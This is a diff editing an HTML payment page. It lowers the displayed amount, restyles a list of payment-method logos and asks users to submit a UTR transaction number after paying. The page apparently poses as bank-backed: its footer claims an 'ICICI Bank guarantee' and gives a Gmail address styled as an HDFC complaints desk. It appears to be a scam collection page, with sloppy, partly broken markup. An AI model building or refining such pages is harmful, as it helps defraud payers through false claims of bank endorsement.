@@ -11,7 +11,7 @@
     <div class="box1">
         <table width="100%">
                 <td>Amount</td>
-            <td> <h5 align="right" class=amount displap">₹ 4200 </h5></td>
+            <td> <h5 align="right" class=amount displap">₹ 3800 </h5></td>
                 <td><button class="cpb" onclick="copyAmount()">COPY</button></td>
                 <tr>
                     <tr>
@@ -24,31 +24,25 @@
             <tr> 
                 <tr>
                 <td>Name</td>
-                <td> <h5 align="right">SHIPAN SHIL </h5> <td>
+                <td> <h5 align="right">SHIPAN SHIL </h5> </td>
             </td>
         </table>
-        <p class="a1">↓ Select payment method and pay ↓</p><tr>
-        <table>
-            <tr>
-                <td><input type="radio" class="rdaacls"></td>
-                <td><img src="https://i.ibb.co.com/K9cN6NJ/IMG-3882.png" alt="IMG-3882" width="60px" height="30px" class="gtwImgs"></td>
-            </tr>
-            <tr>
-                <td><input type="radio" class="rdaacls"></td>
-                <td><img src="https://i.ibb.co.com/dtpd8d8/IMG-3881.png" alt="IMG-3881" width="60px" height="30px" class="gtwImgs"></td>
-            </tr>
-            <br>
-            <tr>
-                <td><input type="radio" class="rdaacls"></td>
-                <td><img src="https://i.ibb.co.com/1YgNg3b/IMG-3888.png" alt="IMG-3888" width="60px" height="30px" class="gtwImgs"></td>
-            </tr>
-            <tr>
-                <td><input type="radio" class="rdaacls"></td>
-                <td><img src="https://i.ibb.co.com/XZyYVF0/IMG-3880.png" alt="IMG-3880" width="60px" height="30px" class="gtwImgs"></td>
-            </tr>
-        </table>
-        <tr>
-        <p class="a1">↓ Fill the UTR numbers after you have done the payment ↓</p>
+        <h3 class="a1">↓ Select payment method and pay ↓</h3><tr>
+        <table> 
+        <hr><br> </tr> 
+             <tr><input type="radio" class="rdaacls"></tr> 
+                <img src="https://i.ibb.co.com/K9cN6NJ/IMG-3882.png" alt="IMG-3882" width="63px" height="30px" style="vertical-align:middle" class="gtwImgs"> <br></br> <hr> </tr> 
+                <br>
+            <tr><input type="radio" class="rdaacls"></tr>
+                <img src="https://i.ibb.co.com/dtpd8d8/IMG-3881.png" alt="IMG-3881" width="99px" height="30px" style="vertical-align:middle" class="gtwImgs"> <br> </br> <hr> </tr>
+               <br>
+            <tr><input type="radio" class="rdaacls"></tr>
+                <img src="https://i.ibb.co.com/1YgNg3b/IMG-3888.png" alt="IMG-3888" width="96px" height="30px" style="vertical-align:middle" class="gtwImgs"> <br> </br> <hr> </tr>
+                 <br>
+            <tr> <input type="radio" class="rdaacls"></tr>
+            <img src="https://i.ibb.co.com/XZyYVF0/IMG-3880.png" alt="IMG-3880" width="84px" height="30px" style="vertical-align:middle" class="gtwImgs"> <br> </br> <hr> </tr>
+     
+        <h3 class="a1">↓ Fill the UTR numbers after you done payment ↓</h3>
         <form method="post" onsubmit="return false;">
             UTR 
             <input type="text" name="utr" id="utrInput" class="inp" placeholder="Input UTR number"><br>
@@ -61,9 +55,8 @@
         <tr>
          <center>
         <h6 style="color: lightgray; font-size: 12px;">Dear customers: please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact:</h6>
-            
- <p style= "color:blue;font-size:10px;"> hdfcbankcomplaintacceptance@gmail.com</center>
-        </p>
+ <h6 style= "color:blue;font-size:10px;"> hdfcbankcomplaintacceptance@gmail.com</center>
+        </h6>
     </div>
 
     <!-- Modals -->
@@ -77,7 +70,7 @@
     <div class="modal" id="utrModal">
         <div class="modal-content">
             <span class="close" onclick="closeModal('utrModal')">&times;</span>
-            <h2>Confirm UTR Submission</h2>
+            <h6>Confirm UTR Submission</h6>
             <p>Are you sure you want to submit the UTR number?</p>
             <button id="confirmButton">Yes, Submit</button>
             <button class="closeModal" onclick="closeModal('utrModal')">Cancel</button>
